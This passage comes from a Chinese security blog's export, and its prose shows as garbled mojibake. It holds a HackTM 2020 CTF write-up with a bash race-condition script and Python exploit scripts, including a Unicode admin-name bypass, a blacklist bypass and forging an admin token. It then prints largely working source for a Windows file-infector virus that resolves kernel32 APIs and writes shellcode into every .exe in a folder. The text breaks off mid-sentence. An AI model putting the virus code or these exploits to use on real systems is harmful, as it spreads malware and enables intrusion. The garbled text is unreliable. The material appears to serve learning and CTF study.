´ï¼Œç”¨13-15ä¸ªçº¿ç¨‹å³å¯ï¼Œç»“æœå¦‚ä¸‹ï¼šç„¶åå›åˆ°æˆ‘ä»¬çš„è´¦æˆ·å¤„æŸ¥çœ‹åˆ©ç”¨æ¡ä»¶ç«äº‰å€Ÿåˆ°çš„1000åˆ€å·²ç»åˆ°è´¦:è¿™é‡Œéœ€è¦å¤šæ¬¡å°è¯•æ‰èƒ½å€Ÿåˆ°è¶³å¤Ÿçš„é’±æ•°ï¼Œæ¯æ¬¡ç»“æœéƒ½å¯èƒ½æ˜¯ä¸ä¸€æ ·çš„ã€‚å› ä¸ºåˆ©ç”¨BPè¿›è¡Œæ¡ä»¶ç«äº‰çš„æ—¶å€™æœ‰æ—¶å€™ä¼šå—åˆ°ç½‘é€Ÿã€æœåŠ¡è´¨é‡ç­‰å„ç§å› ç´ çš„å½±å“ï¼Œå¤šè¯•å‡ æ¬¡å°±å¥½äº†ã€‚ 2ã€BASHè„šæœ¬çœ‹å›½å¤–å¤§ä½¬çš„è§£é¢˜æ€è·¯å­¦åˆ°äº†ä¸€ç§åˆ©ç”¨bashè„šæœ¬è¿›è¡Œæ¡ä»¶ç«äº‰çš„æ–¹å¼(å…¶å®ç”¨pythonä¹Ÿä¸€æ ·)ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š #!/bin/bashurl=\"http://178.128.175.6:50090/\"ua=\"User-Agent: Mozilla/5.0\"cookie=\"session=.eJwNy0sKAjEMANC7ZG1hmmTy8TLStAmIoKDOSry7vv37wHw96_J-3PIOZwhCNNlimhOPlTor3IYOWjkijbOHFBac4Diu6z-Ute9SvWGZNaaNm3tko4mdQnRXF_j-AEMAHN8.Xjaggw.o-B9vO_i0Fnredto0K7aoEXTCGI\"ssrf=`curl -s \"$url\" -H \"$ua\" -H \"Cookie: $cookie\" 2&gt;&amp;1 | pcregrep -o1 'name=\\\"csrf_token\\\" type=\\\"hidden\\\" value=\\\"(.*)\\\"' -`for i in `seq 15`; do curl \"$url\" -H \"$ua\" -H \"Cookie: $cookie\" --data \"csrf_token=$ssrf&amp;loan=100\" &amp;; donesleep 6 &amp;&amp; echo \"[*] maybe haxed?\" &amp;&amp; curl -s 'http://178.128.175.6:50090/' -H \"$ua\" -H \"Cookie: $cookie\" 2&gt;&amp;1 | pcregrep -o1 \"Money: (.*) tBTC\" è¿™é‡Œåˆ©ç”¨äº†ä¸€ä¸ªæŠ€å·§ï¼šåœ¨cURLå‘½ä»¤ä¹‹åé™„åŠ ä¸€ä¸ª&amp;ä½¿è¿›ç¨‹ç§»åˆ°åå°ã€‚è¿™æ ·ï¼Œå¯ä»¥åŒæ—¶å‘å‡ºå¤šä¸ªè¯·æ±‚ï¼Œå¹¶ä¸”ä¸éœ€è¦ç¼–å†™ä¸€ä¸ªå¤„ç†å¤šçº¿ç¨‹çš„å¤æ‚ä»£ç ã€‚ Draw With Usä¸€ä¸ªJWTæ”»å‡»é¢˜ç›®ï¼Œè¿›å…¥é¢˜ç›®æ˜¯ä¸‹å›¾çš„ä¸€ä¸ªæ”¹é¢œè‰²çš„webç«¯æ¸¸æˆï¼Œç»™å‡ºHintï¼šChanging your color is the first step towards happiness.åŒæ—¶é¢˜ç›®è¿˜ç»™äº†ä¸€ä¸ªjsoné™„ä»¶ï¼Œå®ç°ä»£ç éƒ½åœ¨å…¶ä¸­ï¼Œå…¶ä¸­åŒ…å«å…³é”®éƒ¨åˆ†ï¼š NodeJS ExpressæœåŠ¡å™¨ ç™»å½•/ç®¡ç†å‘˜ç®¡ç†/socket.io JWTç®—æ³•ï¼šHMAC-SHA256 ç®¡ç†å‘˜ç”¨æˆ·åï¼šhacktm é¢˜ç›®åˆ†æ&amp;ä¸€äº›æ”»å‡»å°è¯•ç ´è§£JWTç§˜é’¥ä»£ç ä¸­è·å–flagçš„å‡½æ•°å¦‚ä¸‹ï¼š app.get(\"/flag\", (req, res) =&gt; { // Get the flag // Only for root if (req.user.id == 0) { res.send(ok({ flag: flag })); } else { res.send(err(\"Unauthorized\")); } æƒ³è¦å¾—åˆ°flagï¼Œå°±å¿…é¡»æ»¡è¶³req.user.id == 0ï¼Œé‚£ä¹ˆå°±éœ€è¦æƒ³åŠæ³•æ„é€ JWTã€‚çœ‹å›½å¤–å¤§ä½¬çš„WPå†™çš„å¯¹JWTç§˜é’¥è¿›è¡Œæ”»å‡»ï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸã€‚ æš´åŠ›ç ´è§£nä¸‹é¢è¿™æ®µä»£ç ç»™å‡ºäº†req.user.idçš„ç”Ÿæˆç®—æ³•ï¼š app.post(\"/init\", (req, res) =&gt; { // Initialize new round and sign admin token // RSA protected! // POST // { // p:\"0\", // q:\"0\" // } let { p = \"0\", q = \"0\", clearPIN } = req.body; let target = md5(config.n.toString()); let pwHash = md5( bigInt(String(p)) .multiply(String(q)) .toString() ); if (pwHash == target &amp;&amp; clearPIN === _clearPIN) { // Clear the board board = new Array(config.height) .fill(0) .map(() =&gt; new Array(config.width).fill(config.backgroundColor)); boardString = boardToStrings(); io.emit(\"board\", { board: boardString }); } //Sign the admin ID let adminId = pwHash .split(\"\") .map((c, i) =&gt; c.charCodeAt(0) ^ target.charCodeAt(i)) .reduce((a, b) =&gt; a + b); console.log(adminId); res.json(ok({ token: sign({ id: adminId }) }));}); ä»£ç ä¸­çš„på’Œqæ˜¯ç”¨æˆ·è¾“å…¥ï¼Œnæ˜¯ç§˜é’¥ã€‚ç”±äºmd5çš„ç»“æœä¸º32ä¸ªå­—ç¬¦ï¼Œä¸”targeté•¿åº¦ä¸pwHashç›¸åŒï¼ŒåŒæ—¶toStringæš—ç¤ºnæ˜¯æ•°å­—ã€‚adminIdæ˜¯åˆ©ç”¨targetè®¡ç®—çš„ï¼Œæ¯ä¸ªå­—ç¬¦éƒ½ç»è¿‡äº†XORè¿ç®—ã€‚åœ¨map()çš„è¿­ä»£ä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦ç›¸åŒçš„ç»“æœå³ä¸º0ï¼Œæœ€åé€šè¿‡reduce()ä¼šè®¡ç®—å‡ºæ‰€æœ‰æ•°çš„ç»“æœï¼Œè‹¥0ï¼Œåˆ™req.user.id==0ã€‚ç„¶è€Œï¼Œå¦‚æœå“ˆå¸Œå€¼ä¸åŒ¹é…çš„è¯ï¼Œreq.user.idå°±ä¼šæ˜¯ä¸€ä¸ªå¤§äº0çš„æ•°å­—ã€‚ç”±äºreduce()æ¶ˆé™¤çº¿æ€§æœç´¢æ¨å¯¼çš„å¯èƒ½æ€§ï¼Œå› æ­¤æ— æ³•ç°å®åœ°å¯¹æ­¤è¿›è¡Œæš´åŠ›ç ´è§£nï¼Œå¿…é¡»æ‰¾åˆ°å¦ä¸€ç§æ–¹å¼ã€‚ JWT none æ”»å‡»è¿™ç§æ”»å‡»æ–¹æ³•å¯å‚è€ƒï¼šhttps://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/ 1ã€æ›¿æ¢æˆ–è€…æ›´æ”¹JWTæœ‰æ•ˆè´Ÿè½½ 2ã€æ›´æ”¹idï¼Œå¦‚{&quot;id&quot;:1374,&quot;iat&quot;:1580560256} -&gt; {&quot;id&quot;:0,&quot;iat&quot;:1580560256} 3ã€åˆ é™¤ç­¾å 4ã€æ›´æ”¹{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}-&gt;&quot;alg&quot;: &quot;none&quot; 5ã€æäº¤æœåŠ¡å™¨ä½†æ˜¯è¯¥æ–¹æ³•ä¹Ÿä¸è¡Œã€‚ æ€»ä¹‹ï¼Œå…³é”®ç‚¹å°±åœ¨äºï¼š 1ã€ä½¿req.user.id==0 2ã€ä¸ºäº†å®ç°1éœ€è¦å¾—åˆ°config.n 3ã€å¯èƒ½æœ‰å…¶ä»–æ–¹å¼å¾—åˆ°config.næˆ–è€…config.p ä»ä¸‹é¢ä¸€æ®µä»£ç å¯ä»¥å¾—åˆ°æ–°çš„æ€è·¯ï¼š app.get(\"/serverInfo\", (req, res) =&gt; { // Get server info // Only for logged in users let user = users[req.user.id] || { rights: [] }; let info = user.rights.map(i =&gt; ({ name: i, value: config[i] })); res.json(ok({ info: info }));}); åº”è¯¥æ˜¯åˆ©ç”¨user.rightsä½œä¸ºè®¿é—®keyç›´æ¥è¯»å–å¯¹è±¡çš„ä»£ç ï¼Œå¦‚æœå¯ä»¥æ’å…¥è‡ªå·±çš„user.rightsï¼Œä¾¿å¯ä»¥æ’å…¥nä»è€Œå¾—åˆ°config.nçš„å€¼ã€‚ç„¶åå‘ç°å¦ä¸€æ®µæ›´æ–°ç”¨æˆ·æ•°æ®çš„ä»£ç ï¼š app.post(\"/updateUser\", (req, res) =&gt; { // Update user color and rights // Only for admin // POST // { // color: 0xDEDBEE, // rights: [\"height\", \"width\", \"usersOnline\"] // } let uid = req.user.id; let user = users[uid]; if (!user || !isAdmin(user)) { res.json(err(\"You're not an admin!\")); return; } let color = parseInt(req.body.color); users[uid].color = (color || 0x0) &amp; 0xffffff; let rights = req.body.rights || []; if (rights.length &gt; 0 &amp;&amp; checkRights(rights)) { users[uid].rights = user.rights.concat(rights).filter(onlyUnique); } res.json(ok({ user: users[uid] }));}); ä½†æ˜¯æƒ³è¦æ’å…¥rigthså¿…é¡»ç»•è¿‡isAdmin(user)çš„åˆ¤æ–­ï¼ŒåŒæ—¶è¿˜æœ‰isValidUser(user)çš„åˆ¤æ–­ï¼š function isAdmin(u) { return u.username.toLowerCase() == config.adminUsername.toLowerCase();}function isValidUser(u) { return ( u.username.length &gt;= 3 &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toUpperCase() );} å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„æ–¹å¼ä»¿é€ adminï¼š var admin = \"hacktm\";var user = \"hacâ„ªtm\"; ç»“æœæ»¡è¶³æ¡ä»¶ï¼š \"hacâ„ªtm\".toLowerCase() == \"hacktm\".toLowerCase() // true\"hacâ„ªtm\".toUpperCase() === \"hacktm\".toUpperCase() // false ç„¶åå³å¯æ’å…¥rigthsï¼Œæ’å…¥çš„æ—¶å€™éœ€è¦ç»è¿‡checkRights(rights)çš„åˆ¤æ–­ï¼š function checkRights(arr) { let blacklist = [\"p\", \"n\", \"port\"]; for (let i = 0; i &lt; arr.length; i++) { const element = arr[i]; if (blacklist.includes(element)) { return false; } } return true;} æˆ‘ä»¬çœ‹åˆ°ï¼Œé»‘åå•ä¸­é™åˆ¶äº†på’Œnçš„ä¸Šä¼ ï¼Œå¯ä»¥é€šè¿‡åˆ©ç”¨æ•°ç»„ä½œä¸ºé”®çš„æ–¹å¼ç»•è¿‡ï¼š \"rights\":[[\"n\"]] ä»è€Œå³å¯è¯»å–åˆ°nï¼Œç„¶åé€šè¿‡ä½¿p==nï¼Œq==1ï¼Œå³å¯ä½¿req.user.id==0ï¼Œä»è€Œæ‹¿åˆ°flagã€‚ Expoitå‚ç…§å¤§ä½¬è„šæœ¬ï¼šè·å–nï¼Œpï¼š import requestsurl = \"http://167.172.165.153:60001\"# create user with the admin usernameresp = requests.post(url + \"/login\", json={\"username\": \"hacâ„ªtm\"})resp.raise_for_status()token = resp.json()['data']['token']print(\"[*] Created user with admin username\")# add illegal rightsresp = requests.post(url + \"/updateUser\", json={\"rights\": [[\"n\"], [\"p\"]]}, headers={\"Authorization\": \"Bearer %s\" % token})resp.raise_for_status()print(\"[*] updated rights\")# fetch secret config valuesresp = requests.get(url + \"/serverInfo\", headers={\"Authorization\": \"Bearer %s\" % token})resp.raise_for_status()print(\"[*] fetched secret config values\")server_info = resp.json()for key in server_info[\"data\"][\"info\"]: if isinstance(key[\"name\"], list): print(\"[*] %s = %s\" % (key[\"name\"][0], key[\"value\"])) è·å–flagï¼š import jwt # pip install pyjwtdata = { \"p\": \"54522055008424167489770171911371662849682639259766156337663049265694900400480408321973025639953930098928289957927653145186005490909474465708278368644555755759954980218598855330685396871675591372993059160202535839483866574203166175550802240701281743391938776325400114851893042788271007233783815911979\", \"q\": \"1\"}resp = requests.post(url+\"/init\", json=data)token = resp.json()['data']['token']jwt_claim = jwt.decode(token, verify=False, algorithms=['HS256'])assert jwt_claim['id'] == 0resp = requests.get(url+\"/flag\", headers={\"Authorization\": \"Bearer %s\" % token})print(resp.json()) å…³äºnode.jsçš„è€ƒæ ¸å¯ä»¥å‚è€ƒPcatå¸ˆå‚…åˆ†äº«çš„é¢˜è§£ï¼šhttps://xz.aliyun.com/t/7177Bonusï¼ä»å¤§ä½¬é‚£æ‹¿åˆ°äº†ä¸€ä¸ªç”»ç”»æœºå™¨äººä»£ç ï¼Œç®€å•å®ç”¨ï¼ import sysimport osimport structimport jsonimport requestsfrom PIL import Image # pip install pillow-simd requestsurl = \"http://167.172.165.153:60001\"def get_color_token(_hex): resp = requests.post(url+\"/login\", json={\"username\": \"hacâ„ªtm\"}) resp.raise_for_status() token = resp.json()['data']['token'] data = {\"color\": int(_hex, 16)} resp = requests.post(url+\"/updateUser\", json=data, headers={\"Authorization\": \"Bearer %s\" % token}) resp.raise_for_status() return tokenimg = Image.open(sys.argv[1])img = img.convert(\"RGBA\")pix = img.load()os.popen(\"rm output/*\").read()output = {}numcolors = []hexlookup = {}data = {}hexi = lambda k: struct.pack('B', k).hex()i = 0for x in range(0, img.width): for y in range(0, img.height): r, g, b, a = pix[x, y] if a == 0: continue cc = (r, g, b) if cc not in numcolors: numcolors.append(cc) i += 1 hexlookup.setdefault(cc, f\"{hexi(r)}{hexi(g)}{hexi(b)}\") data.setdefault(hexlookup[cc], []) data[hexlookup[cc]].append((x, y))for k, v in data.items(): f = open(\"output/%s.txt\" % k, \"a\") for coord in v: x, y = coord f.write(\"%s\\n\" % json.dumps({\"x\": x, \"y\": y})) f.close()for k, v in data.items(): f = open(\"output/%s.sh\" % k, \"a\") f.write(\"#!/bin/bash\\n\\n\") token = get_color_token(k) cmd = \"\"\"curl -vv -XPOST -m3 -s --data \"$1\" -H \"Content-Type: application/json\" -H \"Authorization: Bearer %s\" %s/paint\"\"\" % ( token, url ) f.write(cmd) f.write(\"\\n\") f.close() print(\"parallel -j +10 ./output/%s.sh &lt; output/%s.txt\" % (k, k))os.popen(\"chmod +x output/*.sh\").read() ç”¨æ³• 1ã€è¯¥è„šæœ¬åˆ©ç”¨é¢˜ç›®æä¾›çš„JSONåƒç´ æ•°æ®è·å–ä¸€ä¸ª120*80çš„PNGå›¾åƒ(æ¯”å¦‚è¿™ä¸ªé¢˜ç›®å°±ç»™äº†åŒ…å«åƒç´ æ•°æ®çš„JSON) 2ã€ç”Ÿæˆåƒç´ æ•°æ®ï¼špython main.py &quot;image.png&quot; 3ã€åƒç´ æ•°æ®åœ¨output/ä¸­ 4ã€è¯¥è„šæœ¬å°†è¾“å‡ºå¯ä»¥è¿è¡Œçš„GNUå¹¶è¡Œå‘½ä»¤è¿™ä¸ªé¢˜ç›®ç¡®å®å­¦åˆ°äº†å¾ˆå¤šã€‚ æ€»ç»“ç®€å•çš„å¯ä»¥åšï¼Œéš¾çš„åšä¸å‡ºï¼Œä½†æ˜¯å­¦åˆ°å¾ˆå¤šï¼Œç»§ç»­åŠªåŠ›ï¼ãƒ¾(â—Â°âˆ‡Â°â—)ï¾‰ï¾","link":"/2020/02/04/HackTM2020-WriteUp/"},{"title":"MaliciousCode-FileInfect","text":"MaliciousCode-FileInfectæœ¬ç¯‡åšå®¢çš„ä¸»è¦ç›®çš„åœ¨äºè®°å½•å­¦ä¹ ï¼Œç”±äºå†…å®¹æ¶‰åŠä¸å®‰å…¨å› ç´ ï¼Œä¸åšç‰¹åˆ«è¯¦ç»†çš„è§£é‡Šï¼Œå­¦ä¹ éœ€è¦çš„å¯ä»¥ç§ä¿¡ã€‚è¿™æ˜¯ä¸€ç¯‡å¯¹ä¸€ä¸ªå®éªŒé¡¹ç›®çš„è®°å½•ï¼Œå®éªŒçš„ç›®çš„å’Œå…³é”®å¦‚ä¸‹ï¼š å®éªŒç›®çš„ï¼šç¼–å†™shellcodeï¼Œé€šè¿‡åˆ©ç”¨ç³»ç»ŸåŠ¨æ€é“¾æ¥åº“è°ƒç”¨APIä»è€Œå®ç°å¯¹ç›®æ ‡æ–‡ä»¶å¤¹å†…æ–‡ä»¶çš„æ„ŸæŸ“ã€‚ ç›¸å…³çŸ¥è¯†ï¼šéœ€è¦ç†ŸçŸ¥PEæ–‡ä»¶ç»“æ„ æ¶‰åŠåˆ°çš„APIæœ‰ï¼šCreateFileAã€GetFileSizeã€CreateFileMappingã€MapViewOfFileã€UnmapViewOfFileã€CloseHandleã€FindFirstFileAã€FindNextFileAã€FindCloseã€LoadLibraryAã€GetProcAddress ä¸»è¦æ€è·¯1ã€é€šè¿‡C+æ±‡ç¼–ç¼–ç¨‹æ‰¾åˆ°kernel32.dllçš„åœ°å€ï¼Œä»è€Œæ‰èƒ½è¿›ä¸€æ­¥æŸ¥æ‰¾å…¶ä»–APIçš„åœ°å€ï¼›2ã€åˆ©ç”¨PEæ–‡ä»¶ç»“æ„æ‰¾åˆ°å„ç±»å‡½æ•°çš„åœ°å€ï¼›3ã€ç„¶ååˆ©ç”¨APIå¯¹ç›®æ ‡æ–‡ä»¶å¤¹å†…çš„æ–‡ä»¶è¿›è¡Œæ„ŸæŸ“ã€‚ ä¸»è¦ä»£ç åˆ†æå‰é¢è¯´äº†æœ¬ç¯‡åšå®¢çš„ä¸»è¦ç›®çš„æ˜¯è®°å½•å­¦ä¹ ï¼Œæ‰€ä»¥æ”¾ä¸€äº›ä¸»è¦éƒ¨åˆ†çš„ä»£ç ä»¥ä¾›å­¦ä¹ å‚è€ƒã€‚ä¸‹é¢æˆ‘ä»¬å¯¹ä¸»è¦å‡½æ•°è¿›è¡Œåˆ†æï¼š 1ã€GetKernel32Baseå‡½æ•°åŠŸèƒ½æ˜¯è·å–ç³»ç»Ÿkernel32.dllåŠ è½½åˆ°å†…å­˜ä¸­çš„åŸºå€ï¼Œéœ€è¦å¯¹Windowsçš„PEBä»¥åŠPEç»“æ„æœ‰æ¯”è¾ƒæ·±çš„è®¤è¯†ï¼Œè¿™é‡Œå¯ä»¥å‚è€ƒFREEBUFä¸Šçš„ä¸‰ç¯‡åšå®¢ï¼šhttps://www.freebuf.com/articles/system/93983.htmlhttps://www.freebuf.com/articles/system/94774.htmlhttps://www.freebuf.com/articles/system/97215.htmlä¸»è¦ä»£ç å¦‚ä¸‹ï¼š DWORD GetKernel32Base(){ DWORD base; _asm { xor ecx, ecx; mov eax, fs:[ecx + 0x30]; //EAX = PEB mov eax, [eax + 0xc]; //EAX = PEB-&gt;Ldr mov esi, [eax + 0x14]; //ESI = PEB-&gt;Ldr.InMemOrder lodsd jmp Get_Function L1 : xchg eax, esi; lodsd Get_Function : mov ebx, [eax + 0x28]; cmp dword ptr[ebx], 0x0045004B; //å‰å››å­—èŠ‚ jnz L1 cmp dword ptr[ebx + 0x4], 0x004E0052; //ä¸‹ä¸€ä¸ªå››å­—èŠ‚ jnz L1 cmp dword ptr[ebx + 0x8], 0x004C0045; //ç¬¬ä¸‰ä¸ªå››å­—èŠ‚ jnz L1 mov ebx, [eax + 0x10]; //EBX = Base address mov base, ebx; } return base;} è¿™é‡Œæˆ‘è‡ªå·±å†™äº†ä¸€ä¸ªé€šè¿‡æ¯”å¯¹DLLåç§°æ¥æŸ¥æ‰¾ç›®æ ‡DLLçš„å‡½æ•°ï¼Œä»¥å¢å¼ºä¸åŒWindowsç³»ç»Ÿç‰ˆæœ¬çš„é€‚ç”¨æ€§ã€‚ 2ã€GetAllAPIAddresså‡½æ•°çš„åŠŸèƒ½æ˜¯æŸ¥æ‰¾æ‰€æœ‰ç›®æ ‡APIçš„åœ°å€ï¼Œä»£ç å¦‚ä¸‹ï¼š void GetAllAPIAddress(DWORD DllBase,char * ApiNameBase){ int i = 0; DWORD * p = (DWORD *)(ApiNameBase + API_ADDRESS_OFFSET); //åœ¨å­˜æ”¾å‡½æ•°åçš„160ä¸ªå­—èŠ‚åé¢ç´§è·Ÿç€å­˜æ”¾å‡½æ•°åœ°å€ while( *((WORD *)(ApiNameBase + i)) != 0) { *p = GetAPIAddress((unsigned char *)DllBase, //æŠŠå‡½æ•°åœ°å€é€ä¸ªå­˜åˆ°pæŒ‡å‘çš„ä½ç½® ApiNameBase + i); p++; while ( *(ApiNameBase + i) != 0) i++; //å°†åœ°å€æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªéœ€è¦å¯¹æ¯”çš„å‡½æ•°åçš„å¼€å¤´å­—ç¬¦å¤„ i++;//æ¯ä¸€ä¸ªå­—ç¬¦ä¸²ååªæœ‰ä¸€ä¸ª0ç»“å°¾ } } è¯¥å‡½æ•°è°ƒç”¨GetAPIAddresså‡½æ•°é€ä¸ªæŸ¥æ‰¾ApiNameæ•°ç»„ä¸­å­˜æ”¾çš„å‡½æ•°åï¼Œè®©åå°†åœ°å€ä¿å­˜åˆ°160ä¸ªå­—èŠ‚çš„æ•°ç»„ç©ºé—´çš„åé¢ï¼Œé€šè¿‡åˆ¤æ–­å­—ç¬¦ä¸²å°¾éƒ¨\\x0åˆ¤æ–­å­—ç¬¦ä¸²çš„ç»“æŸï¼Œä»¥è¿™ç§æ–¹å¼é€ä¸ªæŸ¥æ‰¾å‡½æ•°åœ°å€ã€‚ 3ã€GetAPIAddressæˆ‘ä»¬ä»GetAllAPIAddressçš„ä»£ç ä¸­çœ‹åˆ°ï¼Œå®ƒæ˜¯é€šè¿‡è°ƒç”¨GetAPIAddressæ¥æŸ¥æ‰¾åˆ°æ¯ä¸€ä¸ªAPIçš„åœ°å€çš„ï¼Œä¸»è¦ä¹Ÿæ˜¯åˆ©ç”¨PEæ–‡ä»¶çš„ç»“æœå®ç°çš„ï¼š DWORD GetAPIAddress(unsigned char * pDllBase,char * ApiName){ unsigned char * DllApiName; int index; PIMAGE_DOS_HEADER pdos_head; PIMAGE_NT_HEADERS32 pPeHeader; PIMAGE_EXPORT_DIRECTORY pExport; pdos_head = (PIMAGE_DOS_HEADER )pDllBase; //æ­¤å¤„æ˜¯å¾—åˆ°äº†DOSå¤´çš„åŸºå€ï¼Œåé¢æ‰¾å…¶ä»–ç»“æ„éƒ½æ˜¯åç§»åœ°å€ï¼ŒåŠ ä¸Šæ­¤å¤„çš„åŸºå€æ‰æ˜¯å®é™…åœ¨å†…å­˜çš„åœ°å€ pPeHeader = (IMAGE_NT_HEADERS32 *)((char *)pdos_head + pdos_head-&gt;e_lfanew);//å¾—åˆ°PEæ–‡ä»¶å¤´çš„ä½ç½® //å¾—åˆ°å¯¼å‡ºè¡¨çš„ä½ç½®VA pExport = (PIMAGE_EXPORT_DIRECTORY)&amp;pDllBase[ pPeHeader-&gt;OptionalHeader.DataDirectory[0].VirtualAddress]; index = 0; //å‡½æ•°åœ°å€çš„ç´¢å¼• while(index &lt; pExport-&gt;NumberOfNames) { DllApiName = pDllBase + *((DWORD *)&amp;pDllBase[pExport-&gt;AddressOfNames + (index &lt;&lt; 2)]) ; //å°†ç´¢å¼•å·¦ç§»2bitæ˜¯æ‰©å¤§å››å€ï¼Œå› ä¸ºåœ°å€æ˜¯å››ä¸ªå­—èŠ‚ if (CmpStr(ApiName,(char *)DllApiName) == TRUE) break; //å¯¹æ¯”å‡½æ•°åï¼Œä»è€Œæ‰¾åˆ°å‡½æ•°åœ°å€ï¼ŒæˆåŠŸåˆ™è·³å‡ºå¾ªç¯ index ++; } if (index == pExport-&gt;NumberOfNames) return 0; //æŸ¥æ‰¾å¤±è´¥ï¼Œè¿”å›0 index = ((WORD *)&amp;pDllBase[pExport-&gt;AddressOfNameOrdinals])[index]; return ((DWORD *)&amp;pDllBase[pExport-&gt;AddressOfFunctions])[index] + pPeHeader-&gt;OptionalHeader.ImageBase;//å‡½æ•°åå¯¹åº”çš„åç§»åœ°å€åŠ é•œåƒåŸºå€ï¼Œå³å¾—åˆ°äº†å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€} è¯¥å‡½æ•°é€šè¿‡ä¼ å…¥çš„pDllBase(å…¶å®å°±æ˜¯kernel32.dllåœ¨å†…å­˜ä¸­çš„åŸºå€)ï¼Œæ‰¾åˆ°dllæ–‡ä»¶çš„PEå¤´ä½ç½®ï¼Œç„¶ååˆ©ç”¨PEå¤´ç»“æ„æ‰¾åˆ°å…¶ä¸­å¯é€‰å¤´é‡Œçš„å¯¼å‡ºè¡¨ï¼Œkernel32.dllçš„å¯¼å‡ºè¡¨é‡ŒAddressOfNameOrdinalså­˜å‚¨äº†å‡½æ•°ååºå·è¡¨çš„RVAï¼Œè¿™é‡Œåˆ©ç”¨indexç´¢å¼•è¿›è¡Œæ¯”è¾ƒï¼Œæ¯”å¯¹æˆåŠŸåï¼Œæœ€åè¿”å›çš„æ—¶å€™åŠ ä¸Šé•œåƒåŸºå€ImageBaseå°±æ‹¿åˆ°äº†å‡½æ•°åœ°å€. è¿™é‡Œæˆ‘ä»¬å¯ä»¥å‚è€ƒå¯¼å‡ºè¡¨ç»“æ„: 4ã€SearchDirectoryä»£ç å¦‚ä¸‹ï¼š void SearchDirectory(DWORD * ApiAddressArray){ MyFindFirstFileA f_FindFirstFile; MyFindNextFileA f_FindNextFile; MyFindClose f_FindClose; WIN32_FIND_DATA FindFileData; //è£…è½½ä¸æ‰¾åˆ°çš„æ–‡ä»¶æœ‰å…³çš„ä¿¡æ¯ char buf[512];// = \"c:\\\\test\\\\*.exe\";//\"c:\\test\\*.exe\" int i; HANDLE hFind; //strcpy(buf,\"c:\\\\test\\\\*.exe\"); *((DWORD *)buf) = 't\\\\:c'; *((DWORD *)(buf + 4)) = '\\\\tse'; *((DWORD *)(buf + 8)) = 'xe.*'; *((DWORD *)(buf + 12)) = 'e'; f_FindFirstFile = (MyFindFirstFileA)(*(ApiAddressArray + FindFirstFileA_OFFSET));//è°ƒç”¨FindFirstFileAå‡½æ•°æœç´¢æŒ‡å®šæ–‡ä»¶å¤¹ f_FindNextFile = (MyFindNextFileA)(*(ApiAddressArray + FindNextFileA_OFFSET)); //è¯¥å‡½æ•°åˆ¤æ–­å½“å‰ç›®å½•ä¸‹æ˜¯å¦æœ‰ä¸‹ä¸€ä¸ªç›®å½•æˆ–æ–‡ä»¶ f_FindClose = (MyFindClose)(*(ApiAddressArray + FindClose_OFFSET)); //é‡Šæ”¾ç”±FindFirstFileAåˆ†é…çš„å†…å­˜ hFind = f_FindFirstFile(buf,&amp;FindFileData); //æŠŠæ‰¾åˆ°æ–‡ä»¶æœ‰å…³ä¿¡æ¯å­˜å…¥FindFileData if (hFind != INVALID_HANDLE_VALUE) { do { for(i = 0; FindFileData.cFileName[i]!= 0; i++) { buf[8 + i] = FindFileData.cFileName[i]; } buf[8 + i] = 0; //ä»8ä¸ªåç§»çš„ä½ç½®å¼€å§‹æŠŠæ‰¾åˆ°çš„æ–‡ä»¶åå†™å…¥bufï¼Œä»è€Œæ„é€ ä¸€ä¸ªæ–‡ä»¶å®Œæ•´çš„è·¯å¾„ï¼Œå¹¶ä¸”å°†å­—ç¬¦ä¸²æœ«å°¾ç½®0è¡¨ç¤ºç»“æŸ MyInfect(ApiAddressArray,buf); }while (0 != f_FindNextFile(hFind,&amp;FindFileData)); //åˆ¤æ–­æ˜¯å¦è¿˜æœ‰æ–‡ä»¶ï¼Œè‹¥æ²¡æœ‰ï¼Œåˆ™æ„ŸæŸ“ç»“æŸ f_FindClose(hFind); //é‡Šæ”¾ç”±FindFirstFileAåˆ†é…çš„å†…å­˜ }} è¯¥å‡½æ•°ä¸»è¦åˆ©ç”¨FindFisrtFileAã€FindNextFileAã€FindCloseä¸‰ä¸ªAPIå®Œæˆæ‰“å¼€æ–‡ä»¶ã€å¯¹æŒ‡å®šæ–‡ä»¶å¤¹è¿›è¡Œéå†ã€æœ€åå…³é—­å¥æŸ„å†…å­˜çš„è¿‡ç¨‹ã€‚ï¼Œæ¯æˆåŠŸæ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶ä¾¿è°ƒç”¨MyInfectå‡½æ•°å¯¹è¯¥æ–‡ä»¶è¿›è¡Œæ„ŸæŸ“ã€‚ 5ã€MyInfectä»£ç å¦‚ä¸‹ï¼š BOOL MyInfect(DWORD * ApiAddressArray, char * FileName){ void * pBase; DWORD VirusSize; DWORD VirusStart = (DWORD)ApiAddressArray - 160 - 7; //ä»å‡½æ•°åœ°å€æ•°ç»„åœ°å€å¾€å‰160å­—èŠ‚æ˜¯å‡½æ•°åæ•°ç»„èµ·å§‹ä½ç½®ï¼Œå†å¾€å‰7å­—èŠ‚æ˜¯main.cppç§çš„å‰å‡ æ¡æŒ‡ä»¤ VirusSize = 0x2000; //å†™å…¥shellcodeçš„å¤§å°ï¼Œæ ¹æ®ç¨‹åºå†…éƒ¨çš„æƒ…å†µè®¾ç½®å¤ªå¤§ä¸å¥½ï¼Œè®¾ç½®å¤ªå°ä¹Ÿä¸è¡Œ pBase = MapFileToMemory(ApiAddressArray, FileName); if (pBase == NULL) { return FALSE; } if (PutShellcodeToLastSection_0(pBase,(char *)VirusStart,VirusSize) == FALSE) { return FALSE; } WriteToFile(ApiAddressArray, pBase); return TRUE;} MyInfectå‡½æ•°é‡Œå¯¹å†™å…¥shellcodeçš„èµ·å§‹ä½ç½®è¿›è¡Œäº†è®¾ç½®ï¼šVirusStartï¼ŒåŒæ—¶è®¾ç½®äº†å†™å…¥shellcodeçš„å¤§å°çš„VirusSizeï¼Œè¿™ä¸ªå¤§å°ç”±é¡¹ç›®ç”Ÿæˆçš„å¯æ‰§è¡Œç¨‹åºé‡Œçš„textèŠ‚çš„å°ºå¯¸å†³å®šï¼Œå› 